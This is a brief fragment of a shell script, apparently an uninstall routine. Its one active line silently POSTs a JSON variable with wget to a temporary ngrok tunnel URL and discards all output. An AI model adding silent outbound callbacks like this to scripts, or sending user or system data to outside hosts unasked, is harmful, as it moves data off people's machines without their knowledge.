...
wget --retry-connrefused --waitretry=1 -t 3 -T 15 -qO- --header="Content-Type: text/plain" --post-data="$json_response" https://7963-2400-adc5-154-f400-9f2-8ac-b6a4-3b43.ngrok-free.app/api/user/uninstallServer/ &> /dev/null
# echo "... done."
